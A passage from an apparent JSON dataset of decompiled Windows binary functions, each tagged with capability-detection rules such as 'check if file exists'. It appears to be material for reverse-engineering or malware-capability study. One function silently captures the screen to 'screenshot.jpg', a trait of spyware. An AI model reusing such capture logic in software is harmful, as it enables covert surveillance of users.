        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004130dd(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t unaff_EBP;\n    uint var_37ch;\n    uint var_378h;\n    uint var_374h;\n    uint var_370h;\n    uint var_36ch;\n    uint var_368h;\n    uint var_364h;\n    uint var_360h;\n    uint var_344h;\n    uint var_334h;\n    uint var_330h;\n    uint var_328h;\n    uint var_220h;\n    uint var_118h;\n    uint var_4h;\n    \n    fcn.004208fe(0x374);\n    uVar2 = *0x446008;\n    *(unaff_EBP + -0x37c) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x374) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x364) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x378) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x36c) = 0;\n    *(unaff_EBP + -0x368) = 0;\n    fcn.004257d0(unaff_EBP + -0x220, 0, 0x104);\n    fcn.004257d0(unaff_EBP + -0x328, 0, 0x104);\n    uVar3 = fcn.00416c79(0x1a);\n    (**0x4464ac)(unaff_EBP + -0x220, uVar3);\n    (**0x4464ac)(unaff_EBP + -0x220, uVar2);\n    (**0x4464ac)(unaff_EBP + -0x220, *(unaff_EBP + -0x364));\n    uVar3 = *0x446040;\n    *(unaff_EBP + -0x370) = 0;\n    iVar4 = (**0x4464dc)(*(unaff_EBP + -0x364), uVar3);\n    if (iVar4 == 0) {\n        *(unaff_EBP + -0x370) = 1;\n    }\n    iVar4 = (**0x4464dc)(*(unaff_EBP + -0x364), *0x445ad4);\n    if (iVar4 == 0) {\n        *(unaff_EBP + -0x370) = 2;\n    }\n    uVar3 = fcn.00416c79(0x1a);\n    (**0x4464ac)(unaff_EBP + -0x328, uVar3);\n    (**0x4464ac)(unaff_EBP + -0x328, uVar2);\n    fcn.004257d0(unaff_EBP + -0x118, 0, 0x104);\n    (**0x4464ac)(unaff_EBP + -0x118, unaff_EBP + -0x220);\n    (**0x4464ac)(unaff_EBP + -0x118, 0x43bd7c);\n    (**0x4464ac)(unaff_EBP + -0x118, *0x445d10);\n    pcVar5 = unaff_EBP + -0x118;\n    *(unaff_EBP + -0x330) = 0xf;\n    *(unaff_EBP + -0x334) = 0;\n    *(unaff_EBP + -0x344) = 0;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00403fb5(unaff_EBP + -0x118, pcVar5 - (unaff_EBP + -0x117));\n    *(unaff_EBP + -4) = 0;\n    puVar6 = fcn.00416865(unaff_EBP + -0x360);\n    if (7 < puVar6[5]) {\n        puVar6 = *puVar6;\n    }\n    uVar7 = (**0x4462f0)(puVar6);\n    if ((uVar7 == 0xffffffff) || (*(unaff_EBP + -0x364) = 1,  (uVar7 & 0x10) != 0)) {\n        *(unaff_EBP + -0x364) = 0;\n    }\n    fcn.0040c0f0(1);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00403f73(1, 0);\n    if (*(unaff_EBP + -0x364) != 0) {\n        iVar4 = fcn.0040e80b(unaff_EBP + -0x118, unaff_EBP + -0x368);\n        if (iVar4 == 0) {\n            fcn.0040e771();\n        }\n    }\n    iVar4 = *(unaff_EBP + -0x37c);\n    fcn.004102de(0x43bd76, unaff_EBP + -0x220, *(unaff_EBP + -0x374), *(unaff_EBP + -0x36c), *(unaff_EBP + -0x368), \n                 *(iVar4 + 0x20), *(unaff_EBP + -0x378));\n    if (*(iVar4 + 6) != '\\0') {\n        fcn.004126ff(iVar4, unaff_EBP + -0x328, *(unaff_EBP + -0x374));\n    }\n    fcn.0040e771();\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 1359
    },
    "00413509": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413509(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_EDI;\n    uint *arg_8h_00;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    fcn.004257d0(&var_218h, 0, 0x104);\n    fcn.004257d0(&var_110h, 0, 0x104);\n    uVar1 = fcn.00416c79(0x1a);\n    (**0x4464ac)(&var_218h, uVar1);\n    (**0x4464ac)(&var_218h);\n    (**0x4464ac)(&var_110h, &var_218h);\n    (**0x4464ac)(&var_110h, 0x43ea5c);\n    (**0x4464ac)(&var_110h, 0x43ea60);\n    (**0x4464ac)(&var_110h, 0x43e1b8);\n    (**0x4464ac)(&var_110h, 0x43e1ac);\n    (**0x4464ac)(&var_110h, 0x43ea64);\n    (**0x4464ac)(&var_110h, 0x43ea68);\n    (**0x4464ac)(&var_110h, 0x43e1a8);\n    (**0x4464ac)(&var_110h, 0x43e1a4);\n    (**0x4464ac)(&var_110h, 0x43e1d0);\n    arg_8h_00 = &var_110h;\n    (**0x4464ac)(arg_8h_00, 0x43ea6c);\n    uVar2 = (**0x4463fc)(&var_110h);\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) == 0)) {\n        fcn.0040b307();\n        iVar3 = fcn.00413372();\n        if (iVar3 != 0) {\n            fcn.004105ae(0x43bd76, &var_218h, arg_8h, *(unaff_EDI + 0x20), arg_ch);\n        }\n        (**0x446568)(*0x4462c4);\n    }\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 620
    },
    "0041412c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041412c(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    \n    if ((*(*(*unaff_ESI + 4) + 0xc + unaff_ESI) & 6) == 0) {\n        iVar1 = (**(**(*(*unaff_ESI + 4) + 0x38 + unaff_ESI) + 0x34))(param_1);\n        if (iVar1 == -1) {\n            fcn.0041416b(4, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00415262": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00415262(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(0x14);\n    fcn.0041dbc3(0);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = *0x4467a8;\n    *(unaff_EBP + -0x10) = *0x4467a8;\n    fcn.0040e1a5();\n    iVar1 = fcn.0040e258();\n    if ((iVar1 == 0) && (iVar2 == 0)) {\n        iVar2 = fcn.0040e2aa(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar2 == -1) {\n            fcn.0041e262(\"bad cast\");\n            fcn.00420046(unaff_EBP + -0x20, 0x4404a4);\n        }\n        iVar2 = *(unaff_EBP + -0x10);\n        *0x4467a8 = iVar2;\n        fcn.0040e1d6();\n        fcn.0041d822(iVar2);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041dbeb();\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 396
    },
    "00415300": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00415300(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(0x14);\n    fcn.0041dbc3(0);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = *0x4467ac;\n    *(unaff_EBP + -0x10) = *0x4467ac;\n    fcn.0040e1a5();\n    iVar1 = fcn.0040e258();\n    if ((iVar1 == 0) && (iVar2 == 0)) {\n        iVar2 = fcn.004153d1(*(unaff_EBP + 8));\n        if (iVar2 == -1) {\n            fcn.0041e262(\"bad cast\");\n            fcn.00420046(unaff_EBP + -0x20, 0x4404a4);\n        }\n        iVar2 = *(unaff_EBP + -0x10);\n        *0x4467ac = iVar2;\n        fcn.0040e1d6();\n        fcn.0041d822(iVar2);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041dbeb();\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 382
    },
    "00416b05": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00416b05(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (**0x446340)(arg_8h, 0x80000000, 3, 0, 3, 0x80, 0);\n    if (iVar1 != -1) {\n        iVar2 = (**0x4462f8)(iVar1, &var_8h);\n        if (iVar2 != 0) {\n            (**0x446344)(iVar1);\n            goto code_r0x00416b57;\n        }\n        (**0x446344)();\n    }\n    var_8h = 0;\n    var_4h = 0;\ncode_r0x00416b57:\n    return CONCAT44(var_4h, var_8h);\n}\n",
        "token_count": 201
    },
    "00416d57": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00416d57(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint unaff_EDI;\n    uint var_54h;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    var_3ch = *0x446274;\n    uStack84 = 0;\n    uStack80 = 0;\n    uStack76 = 0;\n    var_54h = 1;\n    iVar1 = (**0x4464b8)(&var_40h, &var_54h, 0);\n    if (iVar1 == 0) {\n        iVar1 = (**0x446418)(0, 1, &var_38h);\n        if (iVar1 == 0) {\n            uVar2 = (**0x446304)();\n            (**0x446550)(uVar2, &var_24h);\n            var_28h = (**0x44652c)(uVar2);\n            uVar3 = (**0x4463dc)(var_28h);\n            var_34h = (**0x446348)(var_28h, var_1ch, var_18h);\n            var_44h = (**0x446328)(uVar3, var_34h);\n            (**0x446308)(uVar3, 0, 0, var_1ch, var_18h, var_28h, 0, 0, 0xcc0020);\n            iVar1 = (**0x446478)(var_34h, 0, &var_2ch);\n            if (iVar1 == 0) {\n                iVar1 = fcn.00416cd2(&var_14h);\n                if (iVar1 != -1) {\n                    iVar1 = (**0x44644c)(var_2ch, var_38h, &var_14h, 0);\n                    if (iVar1 == 0) {\n                        (**0x446314)(var_38h, &var_30h);\n                        (**0x446358)(var_30h);\n                        uVar4 = (**0x4462ec)(var_30h);\n                        fcn.0041d4dc(\"\\\\screenshot.jpg\", uVar4, 3);\n                        (**0x446328)(uVar3, var_44h);\n                        (**0x44638c)(var_2ch);\n                        (**0x446498)(var_40h);\n                        (**0x4464c4)(var_34h);\n                        (**0x4464c4)(uVar3);\n                        (**0x4464b0)(uVar2, var_28h);\n                        (**0x446520)(uVar2);\n                    }\n                }\n            }\n        }\n    }\n    fcn.0041e0a1(unaff_EDI);\n    return;\n}\n",
        "token_count": 743
    },
    "00418cd4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00418cd4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(0x14);\n    fcn.0041dbc3(0);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = *0x4467b0;\n    *(unaff_EBP + -0x10) = *0x4467b0;\n    fcn.0040e1a5();\n    iVar1 = fcn.0040e258();\n    if ((iVar1 == 0) && (iVar2 == 0)) {\n        iVar2 = fcn.00418e0c(*(unaff_EBP + 8));\n        if (iVar2 == -1) {\n            fcn.0041e262(\"bad cast\");\n            fcn.00420046(unaff_EBP + -0x20, 0x4404a4);\n        }\n        iVar2 = *(unaff_EBP + -0x10);\n        *0x4467b0 = iVar2;\n        fcn.0040e1d6();\n        fcn.0041d822(iVar2);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041dbeb();\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 387
    },
    "00418d70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00418d70(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(0x14);\n    fcn.0041dbc3(0);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = *0x4467b4;\n    *(unaff_EBP + -0x10) = *0x4467b4;\n    fcn.0040e1a5();\n    iVar1 = fcn.0040e258();\n    if ((iVar1 == 0) && (iVar2 == 0)) {\n        iVar2 = fcn.00418e91(*(unaff_EBP + 8));\n        if (iVar2 == -1) {\n            fcn.0041e262(\"bad cast\");\n            fcn.00420046(unaff_EBP + -0x20, 0x4404a4);\n        }\n        iVar2 = *(unaff_EBP + -0x10);\n        *0x4467b4 = iVar2;\n        fcn.0040e1d6();\n        fcn.0041d822(iVar2);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041dbeb();\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 386
    },
    "0041c800": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0041c800(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    int32_t unaff_ESI;\n    \n    *(unaff_ESI + 0x7c) = 0;\n    *(unaff_ESI + 0x84) = 0;\n    *(unaff_ESI + 0x80) = 0;\n    *(unaff_ESI + 0x78) = 0;\n    *(unaff_ESI + 0x70) = 0;\n    *(unaff_ESI + 0x90) = 0;\n    *(unaff_ESI + 0x74) = 0;\n    if (param_1 == 0) {\n        iVar1 = 0x10000;\n    }\n    else {\n        arg_8h = (**0x446340)(param_1, 0x80000000, 1, 0, 3, 0, 0);\n        if (arg_8h == -1) {\n            iVar1 = 0x200;\n        }\n        else {\n            iVar1 = fcn.0041c87b(arg_8h, 0);\n            if (iVar1 == 0) {\n                *(unaff_ESI + 0x80) = 1;\n                iVar1 = 0;\n            }\n            else {\n                (**0x446344)(arg_8h);\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 330
    },
    "0041c87b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041c87b(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *arg_ch_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    ulong uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    arg_ch_00 = unaff_EBX + 0x70;\n    var_20h = arg_8h;\n    *(unaff_EBX + 0x7c) = 0;\n    *(unaff_EBX + 0x84) = 0;\n    *(unaff_EBX + 0x80) = 0;\n    *(unaff_EBX + 0x78) = 0;\n    *arg_ch_00 = 0;\n    *(unaff_EBX + 0x90) = 0;\n    *(unaff_EBX + 0x74) = 0;\n    if ((arg_8h != 0) && (arg_8h != -1)) {\n        iVar2 = (**0x44635c)(*(unaff_EBX + 4), 0, 0, 1);\n        iVar1 = var_20h;\n        if (iVar2 == -1) {\n            *arg_ch_00 = -1;\n            *(unaff_EBX + 0x4c) = 0x80000000;\n            if (arg_ch != 0) {\n                *arg_ch_00 = arg_ch;\n            }\n            *(unaff_EBX + 0x6c) = 0;\n            (**0x446434)(&var_14h);\n            (**0x446450)(&var_14h, &var_28h);\n            uVar4 = var_28h;\n            uVar5 = var_24h;\n            fcn.0041c3aa(var_28h);\n            uVar3 = fcn.0041c388(var_28h, var_24h, uVar4, uVar5);\n            uVar5 = uVar3 >> 0x20;\n            uVar4 = uVar3;\n            *(unaff_EBX + 0x50) = uVar4;\n            *(unaff_EBX + 0x58) = uVar4;\n            *(unaff_EBX + 0x60) = uVar4;\n            *(unaff_EBX + 0x5c) = uVar5;\n            *(unaff_EBX + 100) = uVar5;\n            *(unaff_EBX + 0x68) = CONCAT22(var_1ch, var_18h);\n            *(unaff_EBX + 0x54) = uVar5;\n            *(unaff_EBX + 0x7c) = var_20h;\n        }\n        else {\n            iVar2 = fcn.0041c411(unaff_EBX + 0x4c, arg_ch_00, unaff_EBX + 0x68);\n            if (iVar2 == 0) {\n                (**0x44635c)(iVar1, 0, 0, 0);\n                *(unaff_EBX + 0x6c) = 1;\n                *(unaff_EBX + 0x7c) = iVar1;\n            }\n        }\n    }\n    fcn.0041e0a1(var_28h);\n    return;\n}\n",
        "token_count": 845
    },
    "0041cce6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0041cce6(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    while ((arg_ch = fcn.0041cb20(0x4000),  arg_ch != 0 && (arg_ch != -1))) {\n        iVar1 = fcn.0041c68b(in_EAX + 0x94, arg_ch);\n        if (iVar1 != arg_ch) {\n            return 0x60000;\n        }\n        var_4h = var_4h + arg_ch;\n    }\n    *(in_EAX + 0x90) = var_4h;\n    return 0;\n}\n",
        "token_count": 170
    },
    "0041eec8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041eec8(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t uVar2;\n    uint8_t **arg_8h_00;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00425be0(0x43fd58, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    if (arg_8h_00 == NULL) {\n        puVar3 = fcn.004221b6();\n        *puVar3 = 0x16;\n        fcn.00423a7a();\n        goto code_r0x0041efb3;\n    }\n    fcn.0041f09b(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar4 = fcn.00426016(arg_8h_00);\n        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n            iVar5 = 0x443e10;\n        }\n        else {\n            iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x456fe0);\n        }\n        if ((*(iVar5 + 0x24) & 0x7f) == 0) {\n            if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n                iVar5 = 0x443e10;\n            }\n            else {\n                iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x456fe0);\n            }\n            if ((*(iVar5 + 0x24) & 0x80) == 0) goto code_r0x0041ef7e;\n        }\n        puVar3 = fcn.004221b6();\n        *puVar3 = 0x16;\n        fcn.00423a7a();\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x0041ef7e:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar4 = fcn.0042378c(*(unaff_EBP + 8), arg_8h_00);\n        }\n        else {\n            uVar2 = *(unaff_EBP + 8);\n            **arg_8h_00 = uVar2;\n            uVar4 = uVar2;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar4;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0041efbc();\ncode_r0x0041efb3:\n    fcn.00425c25();\n    return;\n}\n",
        "token_count": 809
    },
    "0041f6fa": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041f6fa(uint arg_8h)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t **arg_8h_00;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00425be0(0x43fe00, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == NULL) {\n        puVar2 = fcn.004221b6();\n        *puVar2 = 0x16;\n        fcn.00423a7a();\n        goto code_r0x0041f7dd;\n    }\n    fcn.0041f09b(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar3 = fcn.00426016(arg_8h_00);\n        if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n            iVar4 = 0x443e10;\n        }\n        else {\n            iVar4 = (uVar3 & 0x1f) * 0x40 + *((uVar3 >> 5) * 4 + 0x456fe0);\n        }\n        if ((*(iVar4 + 0x24) & 0x7f) == 0) {\n            if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n                iVar4 = 0x443e10;\n            }\n            else {\n                iVar4 = (uVar3 & 0x1f) * 0x40 + *((uVar3 >> 5) * 4 + 0x456fe0);\n            }\n            if ((*(iVar4 + 0x24) & 0x80) == 0) goto code_r0x0041f7b0;\n        }\n        puVar2 = fcn.004221b6();\n        *puVar2 = 0x16;\n        fcn.00423a7a();\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x0041f7b0:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar3 = fcn.0042709e(arg_8h_00);\n        }\n        else {\n            uVar3 = **arg_8h_00;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar3;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0041f7e6();\ncode_r0x0041f7dd:\n    fcn.00425c25();\n    return;\n}\n",
        "token_count": 769
    },
    "00405bcb": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405bcb(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint8_t **in_EDX;\n    uint32_t uVar8;\n    int32_t unaff_EDI;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint8_t *var_14h;\n    uint8_t *var_10h;\n    uint32_t var_ch;\n    uint8_t *var_8h;\n    uint8_t *var_4h;\n    \n    var_4h = *in_EDX;\n    var_10h = *(unaff_EDI + 0x34);\n    var_8h = in_EDX[1];\n    var_ch = *(unaff_EDI + 0x20);\n    uVar8 = *(unaff_EDI + 0x1c);\n    if (var_10h < *(unaff_EDI + 0x30)) {\n        var_14h = *(unaff_EDI + 0x30) + (-1 - var_10h);\n    }\n    else {\n        var_14h = *(unaff_EDI + 0x2c) - var_10h;\n    }\n    uVar5 = *(arg_8h * 4 + 0x43c510);\n    uVar2 = *(arg_ch * 4 + 0x43c510);\n    do {\n        for (; uVar8 < 0x14; uVar8 = uVar8 + 8) {\n            var_8h = var_8h + -1;\n            var_ch = var_ch | *var_4h << (uVar8 & 0x1f);\n            var_4h = var_4h + 1;\n        }\n        puVar4 = arg_10h + (uVar5 & var_ch) * 8;\n        uVar1 = *puVar4;\ncode_r0x00405c69:\n        uVar6 = uVar1;\n        if (uVar6 != 0) {\n            var_ch = var_ch >> (puVar4[1] & 0x1f);\n            uVar8 = uVar8 - puVar4[1];\n            if ((uVar1 & 0x10) == 0) {\n                if ((uVar1 & 0x40) == 0) break;\n                if ((uVar1 & 0x20) == 0) {\n                    in_EDX[6] = \"invalid literal/length code\";\n                    uVar5 = in_EDX[1] - var_8h;\n                    if (uVar8 >> 3 < in_EDX[1] - var_8h) {\n                        uVar5 = uVar8 >> 3;\n                    }\n                    *(unaff_EDI + 0x20) = var_ch;\n                    *(unaff_EDI + 0x1c) = uVar8 + uVar5 * -8;\n                    in_EDX[1] = var_8h + uVar5;\n                    puVar4 = *in_EDX;\n                    *in_EDX = var_4h + -uVar5;\n                    in_EDX[2] = in_EDX[2] + ((var_4h + -uVar5) - puVar4);\n                    *(unaff_EDI + 0x34) = var_10h;\n                    return 0xfffffffd;\n                }\n                uVar5 = in_EDX[1] - var_8h;\n                if (uVar8 >> 3 < in_EDX[1] - var_8h) {\n                    uVar5 = uVar8 >> 3;\n                }\n                arg_8h = 1;\n            }\n            else {\n                uVar6 = uVar6 & 0xf;\n                uVar7 = (*(uVar6 * 4 + 0x43c510) & var_ch) + *(puVar4 + 4);\n                var_ch = var_ch >> uVar6;\n                for (uVar8 = uVar8 - uVar6; uVar8 < 0xf; uVar8 = uVar8 + 8) {\n                    var_8h = var_8h + -1;\n                    var_ch = var_ch | *var_4h << (uVar8 & 0x1f);\n                    var_4h = var_4h + 1;\n                }\n                puVar4 = arg_14h + (uVar2 & var_ch) * 8;\n                uVar1 = *puVar4;\n                var_ch = var_ch >> (puVar4[1] & 0x1f);\n                uVar8 = uVar8 - puVar4[1];\n                while( true ) {\n                    arg_8h = uVar1;\n                    if ((uVar1 & 0x10) != 0) {\n                        arg_8h = arg_8h & 0xf;\n                        for (; uVar8 < arg_8h; uVar8 = uVar8 + 8) {\n                            var_8h = var_8h + -1;\n                            var_ch = var_ch | *var_4h << (uVar8 & 0x1f);\n                            var_4h = var_4h + 1;\n                        }\n                        uVar6 = *(arg_8h * 4 + 0x43c510) & var_ch;\n                        var_ch = var_ch >> arg_8h;\n                        var_14h = var_14h + -uVar7;\n                        uVar8 = uVar8 - arg_8h;\n                        puVar3 = var_10h + -(uVar6 + *(puVar4 + 4));\n                        puVar4 = *(unaff_EDI + 0x28);\n                        if (puVar3 < puVar4) {\n                            do {\n                                puVar3 = puVar3 + (*(unaff_EDI + 0x2c) - puVar4);\n                            } while (puVar3 < puVar4);\n                            arg_8h = *(unaff_EDI + 0x2c) - puVar3;\n                            if (arg_8h < uVar7) {\n                                arg_ch = uVar7 - arg_8h;\n                                do {\n                                    *var_10h = *puVar3;\n                                    var_10h = var_10h + 1;\n                                    puVar3 = puVar3 + 1;\n                                    arg_8h = arg_8h - 1;\n                                } while (arg_8h != 0);\n                                puVar4 = *(unaff_EDI + 0x28);\n                                do {\n                                    *var_10h = *puVar4;\n                                    var_10h = var_10h + 1;\n                                    puVar4 = puVar4 + 1;\n                                    arg_ch = arg_ch + -1;\n                                } while (arg_ch != 0);\n                            }\n                            else {\n                                *var_10h = *puVar3;\n                                var_10h[1] = puVar3[1];\n                                var_10h = var_10h + 2;\n                                puVar3 = puVar3 + 2;\n                                arg_ch = uVar7 - 2;\n                                do {\n                                    *var_10h = *puVar3;\n                                    var_10h = var_10h + 1;\n                                    puVar3 = puVar3 + 1;\n                                    arg_ch = arg_ch + -1;\n                                } while (arg_ch != 0);\n                            }\n                        }\n                        else {\n                            *var_10h = *puVar3;\n                            var_10h[1] = puVar3[1];\n                            var_10h = var_10h + 2;\n                            puVar3 = puVar3 + 2;\n                            arg_ch = uVar7 - 2;\n                            do {\n                                *var_10h = *puVar3;\n                                var_10h = var_10h + 1;\n                                